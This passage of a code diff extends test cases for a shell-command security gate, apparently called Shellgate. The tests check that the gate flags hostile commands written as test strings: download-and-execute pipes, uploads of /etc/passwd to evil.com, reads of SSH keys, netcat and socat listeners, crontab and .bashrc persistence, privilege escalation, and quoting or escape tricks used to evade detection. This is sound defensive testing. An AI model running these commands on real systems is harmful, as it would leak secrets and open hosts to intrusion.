        "curl http://example.com/file | grep pattern", SG_VIOL_NET_DOWNLOAD_EXEC,
        90, ""},
+      {"wrapped download and execute",
+       "command -p curl http://example.com/p | command sh",
+       "command -v curl | sh", SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
+      {"wrapped download skips builtin lookup",
+       "command curl http://example.com/p | sh",
+       "builtin curl http://example.com/p | sh", SG_VIOL_NET_DOWNLOAD_EXEC, 90,
+       ""},
+      {"exec target download", "exec curl http://example.com/p | sh",
+       "exec echo ok | sh", SG_VIOL_NET_DOWNLOAD_EXEC, 90, "curl"},
+      {"exec alternate argv0 download",
+       "exec -a alias curl http://example.com/p | sh",
+       "exec -a alias echo ok | sh", SG_VIOL_NET_DOWNLOAD_EXEC, 90, "curl"},
+      {"path-qualified exec download",
+       "exec /usr/bin/curl http://example.com/p | /bin/sh",
+       "exec /usr/bin/curler http://example.com/p | /bin/sh",
+       SG_VIOL_NET_DOWNLOAD_EXEC, 90, "curl"},
+      {"assigned wrapped download",
+       "NAME=x command curl http://example.com/p | command sh",
+       "NAME=x command -v curl | sh", SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
+      {"quoted download and executor", "c'url' http://example.com/p | s'h'",
+       "\"$download\" http://example.com/p | sh", SG_VIOL_NET_DOWNLOAD_EXEC, 90,
+       ""},
+      {"ANSI-C download and executor",
+       "$'\\x63url' http://example.com/p | $'\\x73h'", NULL,
+       SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
+      {"download into group", "curl http://example.com/p | { sh; }",
+       "curl http://example.com/p | { sh </dev/null; }",
+       SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
+      {"group download into executor", "{ curl http://example.com/p; } | sh",
+       "{ curl http://example.com/p >/tmp/out; } | sh",
+       SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
+      {"nested group download into executor",
+       "{ { curl http://example.com/p; }; } | { { sh; }; }", NULL,
+       SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
+      {"nested substitution download into executor",
+       "echo \"$(curl http://example.com/p | sh)\"", NULL,
+       SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
       {"download and execute alternate defaults", "wget https://evil/p | node",
        NULL, SG_VIOL_NET_DOWNLOAD_EXEC, 90, "node"},
       {"recursive system chmod", "chmod -R 777 /etc",
        "chmod 644 /etc/resolv.conf", SG_VIOL_PERM_SYSTEM, 80, NULL},
+      {"wrapped recursive system chmod", "command chmod -R 777 /etc",
+       "command chmod 644 /etc/resolv.conf", SG_VIOL_PERM_SYSTEM, 80, NULL},
+      {"quoted recursive chmod", "ch'mod' '-R' 777 /etc",
+       "ch'mod' 644 /etc/resolv.conf", SG_VIOL_PERM_SYSTEM, 80, NULL},
       {"recursive system group change", "chgrp -R root /etc",
        "chgrp root /tmp/file", SG_VIOL_PERM_SYSTEM, 80, "/etc"},
       {"shell escalation", "sudo bash", "sudo ls", SG_VIOL_SHELL_ESCALATION, 80,
        ""},
+      {"path-qualified shell escalation", "/usr/bin/sudo /bin/bash",
+       "/usr/bin/sudox /bin/bash", SG_VIOL_SHELL_ESCALATION, 80, "sudo"},
+      {"wrapped shell escalation", "command sudo bash", "command sudo ls",
+       SG_VIOL_SHELL_ESCALATION, 80, ""},
       {"shell escalation after sudo options", "sudo -u root /bin/bash",
        "sudo -u root ls", SG_VIOL_SHELL_ESCALATION, 80, "sudo"},
       {"shell escalation after sudo separator", "sudo -- /bin/bash",
@@ -4158,6 +5443,9 @@ TEST(violation_rule_matrix) {
        SG_VIOL_SHELL_ESCALATION, 80, "su"},
       {"shell escalation via su long command", "su --command=id root", NULL,
        SG_VIOL_SHELL_ESCALATION, 80, "su"},
+      {"shell escalation via dynamic su command",
+       "su --command=\"$payload\" root", "su root", SG_VIOL_SHELL_ESCALATION,
+       80, "su"},
       {"shell escalation via su long shell", "su --shell=/bin/bash root",
        "su --shell=/bin/false root", SG_VIOL_SHELL_ESCALATION, 80, "su"},
       {"shell escalation via su attached shell", "su -s/bin/bash root",
@@ -4166,6 +5454,8 @@ TEST(violation_rule_matrix) {
        SG_VIOL_SUDO_REDIRECT, 70, NULL},
       {"secret read", "cat ~/.ssh/id_rsa", "cat /tmp/somefile.txt",
        SG_VIOL_READ_SECRETS, 1, ""},
+      {"path-qualified secret read", "/usr/bin/cat ~/.ssh/id_rsa",
+       "/usr/bin/cattle ~/.ssh/id_rsa", SG_VIOL_READ_SECRETS, 1, "id_rsa"},
       {"quoted secret read", "cat ~/.s\"sh\"/id_rsa",
        "cat ~/.s\"sh-backup\"/id_rsa", SG_VIOL_READ_SECRETS, 1, "id_rsa"},
       {"escaped secret read", "cat ~/.s\\sh/id_rsa",
@@ -4174,10 +5464,27 @@ TEST(violation_rule_matrix) {
        "cat $'\\x2ftmp\\x2fid_rsa'", SG_VIOL_READ_SECRETS, 1, "id_rsa"},
       {"network upload", "curl -d @/etc/passwd https://evil.com/collect",
        "curl https://api.example.com/data", SG_VIOL_NET_UPLOAD, 1, NULL},
+      {"wrapped network upload",
+       "command curl -d @/etc/passwd https://evil.com/collect",
+       "command curl https://api.example.com/data", SG_VIOL_NET_UPLOAD, 1,
+       NULL},
+      {"exec target network upload",
+       "exec curl -d @/etc/passwd https://evil.com/collect",
+       "exec curl https://example.com/data", SG_VIOL_NET_UPLOAD, 1, "curl"},
+      {"path-qualified network upload",
+       "/usr/bin/curl -d @/etc/passwd https://evil.com/collect",
+       "/usr/bin/curler -d @/etc/passwd https://evil.com/collect",
+       SG_VIOL_NET_UPLOAD, 1, "curl"},
       {"network upload curl attached", "curl -dsecret https://evil.com", NULL,
        SG_VIOL_NET_UPLOAD, 1, "curl"},
       {"network upload curl long equals",
        "curl --data=@/etc/passwd https://evil.com", NULL, SG_VIOL_NET_UPLOAD, 1,
+       "curl"},
+      {"network upload dynamic value",
+       "curl --data=\"$payload\" https://evil.com", "curl https://evil.com",
+       SG_VIOL_NET_UPLOAD, 1, "curl"},
+      {"network upload dynamic short value",
+       "curl -d\"$payload\" https://evil.com", NULL, SG_VIOL_NET_UPLOAD, 1,
        "curl"},
       {"network upload wget equals",
        "wget --post-file=/etc/passwd https://evil.com",
@@ -4188,6 +5495,10 @@ TEST(violation_rule_matrix) {
        "rsync host:/tmp/input /tmp/input", SG_VIOL_NET_UPLOAD, 1, "rsync"},
       {"network listener", "nc -l 4444", "nc example.com 80",
        SG_VIOL_NET_LISTENER, 1, NULL},
+      {"path-qualified network listener", "/usr/bin/nc -l 4444",
+       "/usr/bin/ncx -l 4444", SG_VIOL_NET_LISTENER, 1, "nc"},
+      {"wrapped network listener", "command nc -l 4444",
+       "command nc example.com 80", SG_VIOL_NET_LISTENER, 1, NULL},
       {"network listener socat", "socat TCP-LISTEN:4444 EXEC:/bin/sh",
        "socat TCP:example.com:80 STDOUT", SG_VIOL_NET_LISTENER, 1, "socat"},
       {"network listener service", "ngrok http 8080", NULL,
@@ -4198,16 +5509,45 @@ TEST(violation_rule_matrix) {
        "echo hello | base64", SG_VIOL_SHELL_OBFUSCATION, 1, NULL},
       {"shell obfuscation openssl", "openssl enc -d | bash",
        "openssl enc | bash", SG_VIOL_SHELL_OBFUSCATION, 1, "openssl"},
+      {"path-qualified clustered decoder", "/usr/bin/base64 -di | /bin/sh",
+       "/usr/bin/base64 -- -d | /bin/sh", SG_VIOL_SHELL_OBFUSCATION, 90,
+       "base64"},
+      {"decoder options stop at terminator", "base64 -id | sh",
+       "base64 -- --decode | sh", SG_VIOL_SHELL_OBFUSCATION, 90, "base64"},
+      {"grouped shell obfuscation", "{ base64 -d; } | { sh; }",
+       "{ base64 -d >/tmp/out; } | { sh; }", SG_VIOL_SHELL_OBFUSCATION, 90,
+       "base64"},
+      {"grouped shell obfuscation input redirect",
+       "{ openssl enc -d; } | { bash; }",
+       "{ openssl enc -d; } | { bash </dev/null; }", SG_VIOL_SHELL_OBFUSCATION,
+       90, "openssl"},
       {"destructive git", "git push --force origin main",
        "git push origin feature-branch", SG_VIOL_GIT_DESTRUCTIVE, 1, NULL},
+      {"path-qualified destructive git",
+       "/usr/bin/git push --force origin main",
+       "/usr/bin/gitx push --force origin main", SG_VIOL_GIT_DESTRUCTIVE, 1,
+       "git"},
+      {"wrapped destructive git", "command git push --force origin main",
+       "command git push origin feature-branch", SG_VIOL_GIT_DESTRUCTIVE, 1,
+       NULL},
       {"destructive git clean", "git clean -fdx", "git clean -n",
        SG_VIOL_GIT_DESTRUCTIVE, 1, "clean"},
       {"destructive git history", "git filter-branch -- --all", NULL,
        SG_VIOL_GIT_DESTRUCTIVE, 1, "filter-branch"},
       {"persistence", "echo '* * * * * /tmp/backdoor' | crontab", "crontab -l",
        SG_VIOL_PERSISTENCE, 1, NULL},
+      {"path-qualified crontab", "/usr/bin/crontab /tmp/tab",
+       "/usr/bin/crontabx /tmp/tab", SG_VIOL_PERSISTENCE, 1, "crontab"},
       {"persistence profile", "echo payload >> ~/.bashrc",
        "echo payload >> /tmp/output", SG_VIOL_PERSISTENCE, 1, ".bashrc"},
+      {"builtin persistence profile", "builtin echo payload >~/.bashrc",
+       "builtin echo payload >/tmp/out", SG_VIOL_PERSISTENCE, 1, ".bashrc"},
+      {"dynamic persistence profile", "\"$runtime\" >~/.bashrc",
+       "\"$runtime\" >/tmp/out", SG_VIOL_PERSISTENCE, 1, ".bashrc"},
+      {"group persistence profile", "{ echo payload; } >~/.bashrc",
+       "{ echo payload; } >/tmp/out", SG_VIOL_PERSISTENCE, 1, ".bashrc"},
+      {"redirect-only persistence profile", ">~/.bashrc", ">/tmp/out",
+       SG_VIOL_PERSISTENCE, 1, ".bashrc"},
       {"quoted persistence profile", "echo payload >> ~/.b\"ashrc\"",
        "echo payload >> ~/.b\"ash-profile\"", SG_VIOL_PERSISTENCE, 1, "ashrc"},
       {"escaped persistence profile", "echo payload >> ~/.b\\ashrc",
@@ -4218,6 +5558,158 @@ TEST(violation_rule_matrix) {
   ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
   for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++)
     ASSERT(run_violation_case(gate, &cases[i]));
+  sg_violation_config_t path_config;
+  sg_violation_config_default(&path_config);
+  path_config.download_cmds[0] = "/opt/bin/curl";
+  path_config.download_cmd_count = 1;
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &path_config));
+  const violation_case_t exact_path = {
+      "configured executable path stays exact",
+      "/opt/bin/curl http://example.com/p | sh",
+      "/usr/bin/curl http://example.com/p | sh",
+      SG_VIOL_NET_DOWNLOAD_EXEC,
+      90,
+      "curl",
+  };
+  ASSERT(run_violation_case(gate, &exact_path));
+  sg_gate_free(gate);
+}
+
+/* Redirect setup changes filesystem state even where a later redirection
+ * replaces its byte route. Shellgate must retain that side effect without
+ * mistaking input setup or descriptor duplication for a write. */
+TEST(fd_open_violation_contract) {
+  sg_gate_t *gate = gate_with_violations();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "printf *"));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "exec"));
+
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, "printf x >/etc/replaced >/tmp/out", &result));
+  ASSERT(
+      result.subcommand_count == 1 && result.subcommands[0].write_count == 2 &&
+      (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) &&
+      (result.subcommands[0].violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
+
+  ASSERT_SG_OK(
+      eval_cmd(gate, "{ printf x; } >/etc/group-replaced >/tmp/out", &result));
+  ASSERT(
+      result.subcommand_count == 1 && result.subcommands[0].write_count == 2 &&
+      (result.subcommands[0].violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
+
+  ASSERT_SG_OK(eval_cmd(gate, "exec {fd}>/etc/named-output", &result));
+  ASSERT(result.subcommand_count == 1 &&
+         result.subcommands[0].write_count == 1 &&
+         (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
+
+  ASSERT_SG_OK(eval_cmd(gate, "printf x >>~/.bashrc >/tmp/out", &result));
+  ASSERT(result.subcommand_count == 1 &&
+         result.subcommands[0].write_count == 2 &&
+         (result.violation_type_flags & SG_VIOL_PERSISTENCE));
+
+  ASSERT_SG_OK(
+      eval_cmd(gate, "sudo cat /etc/shadow >/tmp/first >/tmp/out", &result));
+  ASSERT(result.subcommand_count == 1 &&
+         result.subcommands[0].write_count == 2 &&
+         (result.violation_type_flags & SG_VIOL_SUDO_REDIRECT));
+
+  ASSERT_SG_OK(eval_cmd(
+      gate, "printf x >/tmp/replaced >/tmp/out; cat /tmp/replaced", &result));
+  ASSERT((result.violation_type_flags & SG_VIOL_WRITE_THEN_READ) != 0);
+
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  config.redirect_fanout_threshold = 1;
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  ASSERT_SG_OK(eval_cmd(gate, "printf x >/tmp/one >/tmp/two", &result));
+  ASSERT(result.subcommand_count == 1 &&
+         result.subcommands[0].write_count == 2 &&
+         (result.violation_type_flags & SG_VIOL_REDIRECT_FANOUT));
+
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  ASSERT_SG_OK(eval_cmd(gate, "exec {fd}</etc/input-only", &result));
+  ASSERT(result.subcommand_count == 1 &&
+         result.subcommands[0].write_count == 0 &&
+         !(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
+
+  ASSERT_SG_OK(eval_cmd(gate, "exec 3>/tmp/one; exec 4>&3", &result));
+  ASSERT(result.subcommand_count == 2 &&
+         result.subcommands[0].write_count == 1 &&
+         result.subcommands[1].write_count == 0);
+  sg_gate_free(gate);
+}
+
+/* Current-shell builtins still execute redirects and nested shell syntax.
+ * Their graph endpoints must reach the same violation and inspection passes
+ * as ordinary commands. */
+TEST(current_shell_builtin_graph_effects) {
+  sg_gate_t *gate = gate_with_violations();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  sg_result_t result = {0};
+
+  ASSERT_SG_OK(eval_cmd(gate, "cd /tmp >/etc/cd-output", &result));
+  ASSERT(
+      result.has_violations && result.subcommand_count == 1 &&
+      (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) &&
+      (result.subcommands[0].violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
+
+  ASSERT_SG_OK(eval_cmd(gate, "export VALUE=one >/etc/export-output", &result));
+  ASSERT(
+      result.has_violations && result.subcommand_count == 1 &&
+      (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) &&
+      (result.subcommands[0].violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
+
+  ASSERT_SG_OK(eval_cmd(gate, "cd \"$(printf /tmp)\"", &result));
+  ASSERT(result.requires_substitution_evaluation);
+
+  ASSERT_SG_OK(eval_cmd(gate, "cd /tmp >\"$(cat /etc/shadow)\"", &result));
+  ASSERT(result.has_dynamic_substitution_io &&
+         (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE));
+  sg_gate_free(gate);
+}
+
+/* A dynamic FILE name is topology rather than data-as-code, but it still has
+ * an owning command or group even after a later redirect replaces its route. */
+TEST(fd_open_dynamic_filename_consumer_contract) {
+  sg_gate_t *gate = gate_with_violations();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "printf *"));
+
+  static const char *const inputs[] = {
+      "printf x >\"$(cat /etc/shadow)\" >/tmp/out",
+      "{ printf x; } >\"$(cat /etc/shadow)\" >/tmp/out",
+      "exec {fd}>\"$(cat /etc/shadow)\"",
+      "exec {fd}<\"$(cat /etc/shadow)\"",
+      "exec {fd}<>\"$(cat /etc/shadow)\"",
+  };
+  for (size_t i = 0; i < sizeof(inputs) / sizeof(inputs[0]); i++) {
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, inputs[i], &result));
+    ASSERT(result.has_dynamic_substitution_io &&
+           !result.requires_substitution_evaluation &&
+           (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE));
+    uint32_t dynamic_consumers = 0;
+    uint32_t sensitive_consumers = 0;
+    bool named_input_owner = false;
+    for (uint32_t command = 0; command < result.subcommand_count; command++) {
+      dynamic_consumers +=
+          result.subcommands[command].has_dynamic_substitution_io;
+      sensitive_consumers += (result.subcommands[command].violation_type_flags &
+                              SG_VIOL_SUBST_SENSITIVE) != 0;
+      if (i >= 3 && result.subcommands[command].display_command != NULL &&
+          strcmp(result.subcommands[command].display_command, "exec") == 0)
+        named_input_owner =
+            result.subcommands[command].has_dynamic_substitution_io &&
+            (result.subcommands[command].violation_type_flags &
+             SG_VIOL_SUBST_SENSITIVE) != 0;
+    }
+    ASSERT(dynamic_consumers >= 1 && sensitive_consumers >= 1 &&
+           (i < 3 || named_input_owner));
+  }
   sg_gate_free(gate);
 }
 
@@ -4342,6 +5834,87 @@ TEST(violation_configuration_matrix) {
              strstr(record->detail, cases[i].detail_contains));
     sg_gate_free(gate);
   }
+}
+
+TEST(configured_shell_executable_matching) {
+  static const struct {
+    const char *command;
+    uint32_t flag;
+    bool expected;
+  } exact_path_cases[] = {
+      {"curl https://example.test/p | /bin/bash", SG_VIOL_NET_DOWNLOAD_EXEC,
+       true},
+      {"curl https://example.test/p | /opt/bash", SG_VIOL_NET_DOWNLOAD_EXEC,
+       false},
+      {"sudo /bin/bash", SG_VIOL_SHELL_ESCALATION, true},
+      {"sudo -- '/bin/bash'", SG_VIOL_SHELL_ESCALATION, true},
+      {"sudo /opt/bash", SG_VIOL_SHELL_ESCALATION, false},
+      {"su -s /bin/bash root", SG_VIOL_SHELL_ESCALATION, true},
+      {"su --shell /bin/bash root", SG_VIOL_SHELL_ESCALATION, true},
+      {"su -s/bin/bash root", SG_VIOL_SHELL_ESCALATION, true},
+      {"su --shell=/bin/bash root", SG_VIOL_SHELL_ESCALATION, true},
+      {"su -s /opt/bash root", SG_VIOL_SHELL_ESCALATION, false},
+      {"su -s/opt/bash root", SG_VIOL_SHELL_ESCALATION, false},
+      {"su --shell=/opt/bash root", SG_VIOL_SHELL_ESCALATION, false},
+      {"sudo \"$shell\"", SG_VIOL_SHELL_ESCALATION, false},
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  config.shell_spawn_cmds[0] = "/bin/bash";
+  config.shell_spawn_cmd_count = 1;
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+
+  sg_result_t result = {0};
+  for (size_t i = 0; i < sizeof(exact_path_cases) / sizeof(exact_path_cases[0]);
+       i++) {
+    ASSERT_SG_OK(eval_cmd(gate, exact_path_cases[i].command, &result));
+    ASSERT(violation_result_is_consistent(&result));
+    ASSERT(!!(result.violation_type_flags & exact_path_cases[i].flag) ==
+           exact_path_cases[i].expected);
+  }
+
+  config.shell_spawn_cmds[0] = "bash";
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  ASSERT_SG_OK(eval_cmd(gate, "sudo /opt/bash", &result));
+  ASSERT(result.violation_type_flags & SG_VIOL_SHELL_ESCALATION);
+  ASSERT_SG_OK(eval_cmd(gate, "su -s/opt/bash root", &result));
+  ASSERT(result.violation_type_flags & SG_VIOL_SHELL_ESCALATION);
+  ASSERT_SG_OK(
+      eval_cmd(gate, "curl https://example.test/p | /opt/bash", &result));
+  ASSERT(result.violation_type_flags & SG_VIOL_NET_DOWNLOAD_EXEC);
+  sg_gate_free(gate);
+}
+
+TEST(quoted_environment_name_violation) {
+  sg_gate_t *gate = gate_with_violations();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  config.sensitive_env_names[0] = "LD_PRELOAD";
+  config.sensitive_env_name_count = 1;
+  config.sensitive_cmd_names[0] = "export";
+  config.sensitive_cmd_name_count = 1;
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, "export \"LD_PRELOAD=mal.so\"", &result));
+  ASSERT(result.violation_type_flags & SG_VIOL_ENV_PRIVILEGED);
+  bool found = false;
+  for (uint32_t i = 0; i < result.violation_count; i++) {
+    if (result.violations[i].type == SG_VIOL_ENV_PRIVILEGED) {
+      ASSERT(result.violations[i].detail &&
+             strstr(result.violations[i].detail, "LD_PRELOAD before export"));
+      found = true;
+    }
+  }
+  ASSERT(found);
+  ASSERT_SG_OK(eval_cmd(gate, "export \"OTHER=mal.so\"", &result));
+  ASSERT(!(result.violation_type_flags & SG_VIOL_ENV_PRIVILEGED));
+  sg_gate_free(gate);
 }
 
 TEST(violation_configuration_replacement_is_atomic) {
@@ -5666,6 +7239,91 @@ TEST(anomaly_type_netseq_allocation_failure) {
   }
 }
 
+TEST(anomaly_model_failure_verdict_contract) {
+  static const char *command = "cat a ; grep b ; sort";
+  sg_result_t result = {0};
+
+  sg_gate_t *gate = anomaly_gate_with_cache(0);
+  ASSERT(gate != NULL);
+  sg_test_anomaly_score_fail_with(SG_ANOMALY_ERR_MEMORY);
+  ASSERT(eval_cmd(gate, command, &result) == SG_ERR_MEMORY);
+  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
+  sg_test_anomaly_result_reset();
+  sg_gate_free(gate);
+
+  gate = anomaly_gate_with_cache(0);
+  ASSERT(gate != NULL);
+  sg_test_anomaly_score_fail_with(SG_ANOMALY_ERR_FORMAT);
+  ASSERT(eval_cmd(gate, command, &result) == SG_ERR_PARSE);
+  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
+  sg_test_anomaly_result_reset();
+  sg_gate_free(gate);
+
+  gate = anomaly_gate_with_cache(0);
+  ASSERT(gate != NULL);
+  sg_test_anomaly_update_fail_with(SG_ANOMALY_ERR_FORMAT);
+  ASSERT(eval_cmd(gate, command, &result) == SG_ERR_PARSE);
+  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
+  sg_test_anomaly_result_reset();
+  sg_gate_free(gate);
+}
+
+TEST(anomaly_update_outcome_contract) {
+  static const char *command = "cat a ; grep b ; sort";
+  sg_result_t result = {0};
+
+  sg_gate_t *disabled = sg_gate_new();
+  ASSERT(disabled != NULL);
+  ASSERT_SG_OK(eval_cmd(disabled, command, &result));
+  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_NOT_ATTEMPTED);
+  sg_gate_free(disabled);
+
+  sg_gate_t *updated = anomaly_gate_with_cache(0);
+  ASSERT(updated != NULL);
+  ASSERT_SG_OK(eval_cmd(updated, command, &result));
+  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_APPLIED);
+  sg_gate_free(updated);
+
+  sg_gate_t *allow_only = anomaly_gate_with_cache(0);
+  ASSERT(allow_only != NULL);
+  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(allow_only, true));
+  ASSERT_SG_OK(eval_cmd(allow_only, command, &result));
+  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
+  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_SKIPPED_VERDICT);
+  sg_gate_free(allow_only);
+
+  char overlong[SG_ANOMALY_MAX_STAGE_LENGTH + 2];
+  memset(overlong, 'x', sizeof(overlong) - 1);
+  overlong[sizeof(overlong) - 1] = '\0';
+  sg_gate_t *limited = anomaly_gate_with_cache(0);
+  ASSERT(limited != NULL);
+  ASSERT_SG_OK(eval_cmd(limited, overlong, &result));
+  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_REJECTED_LIMIT);
+  sg_gate_free(limited);
+
+  sg_gate_t *memory = anomaly_gate_with_cache(0);
+  ASSERT(memory != NULL);
+  sg_test_anomaly_update_fail_with(SG_ANOMALY_ERR_MEMORY);
+  ASSERT_SG_OK(eval_cmd(memory, command, &result));
+  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_FAILED_MEMORY);
+  sg_test_anomaly_result_reset();
+  ASSERT(sg_gate_anomaly_had_error(memory));
+  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(memory), 0);
+  ASSERT_SG_OK(eval_cmd(memory, command, &result));
+  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_APPLIED);
+  ASSERT(sg_gate_anomaly_vocab_size(memory) > 0);
+  ASSERT(sg_gate_anomaly_had_error(memory));
+  sg_gate_free(memory);
+
+  sg_gate_t *format = anomaly_gate_with_cache(0);
+  ASSERT(format != NULL);
+  sg_test_anomaly_update_fail_with(SG_ANOMALY_ERR_FORMAT);
+  ASSERT(eval_cmd(format, command, &result) == SG_ERR_PARSE);
+  ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_FAILED_FORMAT);
+  sg_test_anomaly_result_reset();
+  sg_gate_free(format);
+}
+
 TEST(anomaly_update_reuses_scored_netseq) {
   static const char *command = "cat a ; grep b ; sort";
   char *sequence = NULL;
@@ -5695,11 +7353,13 @@ TEST(anomaly_ansi_c_netseq_update) {
   ASSERT(gate != NULL);
   sg_result_t result;
 
-  /* The binary builder path is authoritative for ANSI-C quoting. Its raw and
-   * type sequences must survive scoring until the deferred model update. */
+  /* Complete-source NUL rejection must not update the model. Ordinary
+   * ANSI-C quote decoding remains available for anomaly stages. */
   ASSERT_SG_OK(eval_cmd(gate, "echo $'plain'", &result));
   ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(gate), 1);
-  ASSERT_SG_OK(eval_cmd(gate, "printf $'a\\0b'", &result));
+  ASSERT_EQ_INT(eval_cmd(gate, "printf $'a\\0b'", &result), SG_ERR_PARSE);
+  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(gate), 1);
+  ASSERT_SG_OK(eval_cmd(gate, "printf $'ab'", &result));
   ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(gate), 2);
   ASSERT(!sg_gate_anomaly_had_error(gate));
   sg_gate_free(gate);
@@ -5788,14 +7448,10 @@ TEST(anomaly_cache_model_transition_matrix) {
   for (size_t i = 0; i < 70; i++)
     used += (size_t)snprintf(truncated + used, sizeof(truncated) - used,
                              i == 0 ? "x" : " ; x");
-  char actual_buffer[8192], expected_buffer[8192];
   sg_result_t actual, expected;
-  sg_error_t actual_error =
-      sg_gate_evaluate(cached, truncated, strlen(truncated), actual_buffer,
-                       sizeof(actual_buffer), &actual);
+  sg_error_t actual_error = eval_with_prefix(cached, truncated, 8192, &actual);
   sg_error_t expected_error =
-      sg_gate_evaluate(control, truncated, strlen(truncated), expected_buffer,
-                       sizeof(expected_buffer), &expected);
+      eval_with_prefix(control, truncated, 8192, &expected);
   ASSERT(actual_error == SG_ERR_TRUNC && expected_error == SG_ERR_TRUNC);
   ASSERT(actual.truncated && expected.truncated);
   ASSERT(actual.verdict == SG_VERDICT_UNDETERMINED);
@@ -5843,9 +7499,8 @@ TEST(truncated_parse_without_subcommands_is_undetermined) {
   sg_gate_t *g = sg_gate_new();
   ASSERT(g != NULL);
 
-  char buf[8192];
   sg_result_t r;
-  sg_error_t err = sg_gate_evaluate(g, cmd, strlen(cmd), buf, sizeof(buf), &r);
+  sg_error_t err = eval_with_prefix(g, cmd, 8192, &r);
   ASSERT_EQ_UINT(r.subcommand_count, 0);
   ASSERT(r.truncated);
   ASSERT_EQ_INT(err, SG_ERR_TRUNC);
@@ -5915,6 +7570,7 @@ int main(void) {
   printf("Lifecycle:\n");
   RUN(gate_api_contract_matrix);
   RUN(shell_list_parse_boundary_contract);
+  RUN(raw_close_marker_shellgate_contract);
   RUN(word_fragment_operator_shellgate_contract);
   RUN(setter_matrix);
 
@@ -5940,7 +7596,11 @@ int main(void) {
   RUN(canonical_heredoc_delimiter_contract);
   RUN(brace_local_document_policy_contract);
   RUN(nested_composition_matrix);
-  RUN(arithmetic_substitution_dependency);
+  RUN(nested_quoted_expansion_boundaries);
+  RUN(dynamic_arithmetic_is_semantically_rejected);
+  RUN(static_arithmetic_literal_contract);
+  RUN(continued_expansion_policy_contract);
+  RUN(continued_punctuation_policy_contract);
   RUN(dynamic_substitution_flow_contract);
   RUN(herestring_and_transformed_substitution_provenance);
   RUN(brace_group_process_substitution_result_contract);
@@ -5962,6 +7622,10 @@ int main(void) {
   printf("\nFeature rejection:\n");
   RUN(conditional_substitution_matrix);
   RUN(process_substitution_wildcard_policy);
+  RUN(named_fd_process_substitution_policy_contract);
+  RUN(named_fd_builtin_mutation_redirect_policy_contract);
+  RUN(quoted_named_fd_mutation_policy_contract);
+  RUN(decoded_assignment_policy_contract);
 
   printf("\nSuggestions:\n");
   RUN(suggestion_matrix);
@@ -5970,6 +7634,7 @@ int main(void) {
 
   printf("\nEdge cases:\n");
   RUN(eval_input_contract_matrix);
+  RUN(eval_storage_alias_contract);
   RUN(combined_redirect_prefix_word_contract);
   RUN(redirect_only_operation_is_undetermined);
   RUN(named_document_policy_and_stage_contract);
@@ -5980,13 +7645,16 @@ int main(void) {
   printf("\nConfiguration:\n");
   RUN(stop_mode_matrix);
   RUN(stop_mode_substitution_prefix);
+  RUN(stop_mode_group_redirect_entry_order);
   RUN(pipeline_many_subcommands);
   RUN(reject_mask_feature_matrix);
+  RUN(default_reject_mask_catches_continued_arithmetic);
 
   printf("\nPolicy management:\n");
   RUN(policy_mutation_matrix);
   RUN(canonical_policy_mutation_matrix);
   RUN(binary_cpl_policy_contract);
+  RUN(ansi_nul_source_rejection);
